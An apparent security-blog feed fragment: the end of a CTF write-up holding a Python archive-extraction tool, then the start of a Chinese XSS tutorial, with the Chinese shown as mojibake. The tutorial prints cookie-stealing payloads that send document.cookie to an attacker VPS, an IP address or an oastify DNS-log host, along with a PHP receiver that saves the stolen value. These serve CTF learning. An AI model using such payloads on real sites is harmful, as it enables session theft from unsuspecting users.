/span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Shopping-company1ï¼ˆUnsolvedï¼‰"><a href="#Shopping-company1ï¼ˆUnsolvedï¼‰" class="headerlink" title="Shopping company1ï¼ˆUnsolvedï¼‰"></a>Shopping company1ï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@tool</span> <span class="token keyword">def</span> <span class="token function">extract_and_analyze_archive</span><span class="token punctuation">(</span>file_url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">""" è§£å‹å¹¶åˆ†æå‹ç¼©åŒ…å†…å®¹Args:    file_url: å‹ç¼©åŒ…æ–‡ä»¶çš„URLè·¯å¾„    Returns:    str: å‹ç¼©åŒ…å†…å®¹çš„åˆ†æç»“æœ"""</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å¼€å§‹å¤„ç†å‹ç¼©åŒ…: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_url<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token comment"># ä¸‹è½½æ–‡ä»¶</span>    local_file_path <span class="token operator">=</span> download_file_from_url<span class="token punctuation">(</span>file_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> local_file_path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æ— æ³•ä¸‹è½½å‹ç¼©åŒ…æ–‡ä»¶"</span>        <span class="token comment"># æ£€æŸ¥æ˜¯å¦ä¸ºå‹ç¼©åŒ…æ–‡ä»¶</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> is_archive_file<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æä¾›çš„æ–‡ä»¶ä¸æ˜¯æ”¯æŒçš„å‹ç¼©åŒ…æ ¼å¼ï¼ˆæ”¯æŒzipã€rarã€7zï¼‰"</span>        <span class="token comment"># åˆ›å»ºè§£å‹ç›®å½•</span>    extract_dir <span class="token operator">=</span> TEMP_DIR <span class="token operator">/</span> <span class="token string-interpolation"><span class="token string">f"extracted_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>Path<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span><span class="token punctuation">.</span>stem<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    extract_dir<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># æ ¹æ®æ–‡ä»¶ç±»å‹è¿›è¡Œè§£å‹</span>        file_ext <span class="token operator">=</span> Path<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span><span class="token punctuation">.</span>suffix<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> file_ext <span class="token operator">==</span> <span class="token string">'.zip'</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_ref<span class="token punctuation">:</span>                zip_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">elif</span> file_ext <span class="token operator">==</span> <span class="token string">'.rar'</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> rarfile<span class="token punctuation">.</span>RarFile<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> rar_ref<span class="token punctuation">:</span>                rar_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">elif</span> file_ext <span class="token operator">==</span> <span class="token string">'.7z'</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> py7zr<span class="token punctuation">.</span>SevenZipFile<span class="token punctuation">(</span>local_file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sevenz_ref<span class="token punctuation">:</span>                sevenz_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"ä¸æ”¯æŒçš„å‹ç¼©åŒ…æ ¼å¼: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>file_ext<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å‹ç¼©åŒ…è§£å‹åˆ°: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>extract_dir<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token comment"># åˆ†æè§£å‹åçš„å†…å®¹</span>        analysis_result <span class="token operator">=</span> analyze_extracted_files<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>                <span class="token comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                <span class="token keyword">return</span> analysis_result            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token comment"># æ¸…ç†ä¸´æ—¶æ–‡ä»¶</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>local_file_path<span class="token punctuation">)</span>            <span class="token keyword">if</span> extract_dir<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>extract_dir<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"è§£å‹ç¼©å¤±è´¥ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"å‹ç¼©åŒ…å¤„ç†å¤±è´¥: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"å‹ç¼©åŒ…å¤„ç†è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼š</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;wmc.tf å—ï¼Œå”‰èˆèŒåƒ&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;MNGA çš„ WPï¼š &lt;a href=&quot;https://wx.zsxq.com/group/824215518412&quot;&gt;https://wx.zsxq.com/group/824215518412&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS Re:Master</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/17/XSS-Re-Master/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/17/XSS-Re-Master/</id>
    <published>2025-09-17T07:18:09.000Z</published>
    <updated>2026-01-21T07:04:01.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å…³äºè¿™ä¸ªçš„æ€»ç»“å¥½åƒä¸æ˜¯ç‰¹åˆ«å¤šï¼Œååå›½å¤–èµ›ä»¥åŠä¸€äº›è”åˆæˆ˜é˜Ÿçš„æ¯”èµ›ä¹Ÿçˆ±å‡ºè¿™ä¸ªï¼ˆ</p><p>é‚æ•´ç†ä¸€ç‚¹ä¸œè¥¿å‡ºæ¥</p><span id="more"></span><hr><p>ä»‹ç»ï¼š</p><blockquote><p>è¿™æ˜¯ä¸€ç§å°†ä»»æ„ Javascript ä»£ç æ’å…¥åˆ°å…¶ä»– Web ç”¨æˆ·é¡µé¢é‡Œæ‰§è¡Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„çš„æ¼æ´ã€‚æ”»å‡»è€…åˆ©ç”¨æµè§ˆå™¨çš„åŠ¨æ€å±•ç¤ºæ•°æ®åŠŸèƒ½ï¼Œåœ¨ HTML é¡µé¢é‡ŒåµŒå…¥æ¶æ„ä»£ç ã€‚å½“ç”¨æˆ·æµè§ˆè¯¥é¡µæ—¶ï¼Œè¿™äº›æ½œå…¥åœ¨ HTML ä¸­çš„æ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œç”¨æˆ·æµè§ˆå™¨è¢«æ”»å‡»è€…æ§åˆ¶ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç‰¹æ®Šç›®çš„ï¼Œå¦‚ cookie çªƒå–ç­‰ã€‚</p></blockquote><p>åˆ†ç±»ï¼š</p><ul><li><p><strong>åå°„å‹ XSS</strong>ï¼š**&lt;éæŒä¹…åŒ–&gt;** æ”»å‡»è€…äº‹å…ˆåˆ¶ä½œå¥½æ”»å‡»é“¾æ¥, éœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘ XSS ä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€æ¬¡æ€§ï¼Œæ‰€è§å³æ‰€å¾—ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚</p></li><li><p><strong>å­˜å‚¨å‹ XSS</strong>ï¼š**&lt;æŒä¹…åŒ–&gt;**  ä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼ŒåŠ å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™éƒ½ä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œè¿™ç§ XSS éå¸¸å±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œå¤§é‡ç›—çªƒ cookieï¼ˆè™½ç„¶è¿˜æœ‰ç§ DOM å‹ XSSï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯åŒ…æ‹¬åœ¨å­˜å‚¨å‹ XSS å†…ï¼‰ã€‚</p></li><li><p><strong>DOM å‹ XSS</strong>ï¼šåŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹ Document Objeet  Modelï¼ŒDOM)çš„ä¸€ç§æ¼æ´ã€‚DOM æ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€æ— å…³çš„æ¥å£ï¼Œå®ƒå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœèƒ½å¤Ÿæˆä¸ºæ˜¾ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOM ä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ç”¨æˆ·å¯ä»¥æ“çºµçš„ï¼Œå¦‚ uriï¼Œlocationï¼ŒrefelTer ç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡ DOM åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾— DOM ä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æœ DOM ä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼ç¡®è®¤ï¼Œå°±ä¼šäº§ç”Ÿ DOM XSS æ¼æ´ã€‚å‚è€ƒï¼š <a href="https://security.tencent.com/index.php/blog/msg/107">https://security.tencent.com/index.php/blog/msg/107</a></p></li></ul><p>æŸ¥è¯¢æ¥å£ä¸€èˆ¬å®¹æ˜“å‡ºç°åå°„å‹ XSSï¼Œç•™è¨€æ¿å®¹æ˜“å‡ºç°å­˜å‚¨å‹ XSS</p><hr><h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>èœé¸Ÿæ•™ç¨‹ï¼š<a href="https://www.runoob.com/js/js-tutorial.html">https://www.runoob.com/js/js-tutorial.html</a></p><p>æœ€åŸºæœ¬çš„ html ä¸‹çš„ js è¯­å¥</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“é¡µé¢è½½å…¥å®Œæ¯•åæ‰§è¡Œ Javascript ä»£ç </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰"><a href="#DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰" class="headerlink" title="DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰"></a>DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰</h2><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p><strong><code>Document</code></strong>Â æ¥å£è¡¨ç¤ºä»»ä½•åœ¨æµè§ˆå™¨ä¸­è½½å…¥çš„ç½‘é¡µï¼Œå¹¶ä½œä¸ºç½‘é¡µå†…å®¹çš„å…¥å£ï¼Œä¹Ÿå°±æ˜¯Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Using_the_Document_Object_Model">DOM æ ‘</a>ã€‚</p><p><code>getElementById</code> æ–¹æ³•è¿”å›ä¸€ä¸ªè¡¨ç¤ºÂ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/id" title="id"><code>id</code></a>Â å±æ€§ä¸æŒ‡å®šå­—ç¬¦ä¸²ç›¸åŒ¹é…çš„å…ƒç´ çš„Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element"><code>Element</code></a>Â å¯¹è±¡</p><blockquote><p>æ–‡æ¡£ä¸­çš„ ID å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚å¦‚æœä¸€ä¸ªæ–‡æ¡£ä¸­æœ‰ä¸¤ä¸ªåŠä»¥ä¸Šçš„å…ƒç´ å…·æœ‰ç›¸åŒçš„ IDï¼Œé‚£ä¹ˆè¯¥æ–¹æ³•åªä¼šè¿”å›æŸ¥æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p></blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>getElementById ç¤ºä¾‹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>para<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>è¿™é‡Œæœ‰ä¸€äº›æ–‡æœ¬<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">changeColor</span><span class="token punctuation">(</span><span class="token string">'blue'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>è“è‰²<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">changeColor</span><span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>çº¢è‰²<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">function</span> <span class="token function">changeColor</span><span class="token punctuation">(</span><span class="token parameter">newColor</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> elem <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"para"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  elem<span class="token punctuation">.</span>style<span class="token punctuation">.</span>color <span class="token operator">=</span> newColor<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>cookie</code> æ–¹æ³•ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è·å– cookie</p><p>è¿™é‡Œæ¼”ç¤ºä¸€ç§æœ€åŸºæœ¬çš„ xss æ–¹æ³•</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/09/17/XSS-Re-Master/image-20231102204022562.png" alt="image-20231102204022562"></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">document<span class="token punctuation">.</span>cookie<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¾ç½® cookie</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://vps:port/XSS.php?1='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è½¬å‘è¯­å¥ï¼Œè§¦å‘ä¹‹åå°±ä¼šè·³è½¬åˆ°æˆ‘ä»¬çš„ vps çš„ http æœåŠ¡å¹¶æ‰§è¡Œè„šæœ¬å†™å…¥æ–‡ä»¶å¸¦å‡º cookie</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no data input'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ vps ä¸Š nc ç›‘å¬ï¼Œjavascript ç”¨ fetch è¯·æ±‚</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://192.168.173.251:666/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”šè‡³å¯ä»¥ç”¨ dnslog æ¥æ”¶</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://q1sje7nttyar1hl3gyc6xqud54bvzlna.oastify.com/?a='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Element"><a href="#Element" class="headerlink" title="Element"></a>Element</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element">https://developer.mozilla.org/zh-CN/docs/Web/API/Element</a></p><p><strong><code>Element</code></strong>Â æ˜¯æœ€é€šç”¨çš„åŸºç±»ï¼Œ<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document"><code>Document</code></a>Â ä¸­çš„æ‰€æœ‰å…ƒç´ å¯¹è±¡ï¼ˆå³è¡¨ç¤ºå…ƒç´ çš„å¯¹è±¡ï¼‰éƒ½ç»§æ‰¿è‡ªå®ƒã€‚å®ƒåªå…·æœ‰å„ç§å…ƒç´ å…±æœ‰çš„æ–¹æ³•å’Œå±æ€§</p><p><strong><code>Element.innerHTML</code></strong>Â å±æ€§è®¾ç½®æˆ–è·å– HTML è¯­æ³•è¡¨ç¤ºçš„å…ƒç´ çš„åä»£</p><blockquote><p>å¦‚æœä¸€ä¸ªÂ <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/div"><code>&lt;div&gt;</code></a>,Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/span"><code>&lt;span&gt;</code></a>, æˆ–Â <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/noembed"><code>&lt;noembed&gt;</code></a>Â èŠ‚ç‚¹æœ‰ä¸€ä¸ªæ–‡æœ¬å­èŠ‚ç‚¹ï¼Œè¯¥èŠ‚ç‚¹åŒ…å«å­—ç¬¦Â <code>(&amp;)</code>,Â <code>(&lt;)</code>, æˆ–Â <code>(&gt;)</code>,Â <code>innerHTML</code>Â ä¼šå°†è¿™äº›å­—ç¬¦åˆ†åˆ«è¿”å›ä¸º <code>&amp;amp;</code>, <code>&amp;lt;</code> å’Œ <code>&amp;gt;</code>ã€‚ä½¿ç”¨ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Node/textContent"><code>Node.textContent</code></a>Â å¯è·å–ä¸€ä¸ªè¿™äº›æ–‡æœ¬èŠ‚ç‚¹å†…å®¹çš„æ­£ç¡®å‰¯æœ¬ã€‚</p></blockquote><hr><h1 id="ç¼–å†™-XSS-Bot"><a href="#ç¼–å†™-XSS-Bot" class="headerlink" title="ç¼–å†™ XSS Bot"></a>ç¼–å†™ XSS Bot</h1><p><a href="https://blog.csdn.net/diecai2192/article/details/102118060">https://blog.csdn.net/diecai2192/article/details/102118060</a></p><h2 id="Nodejs-puppeteer"><a href="#Nodejs-puppeteer" class="headerlink" title="Nodejs puppeteer"></a>Nodejs puppeteer</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/botview'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token 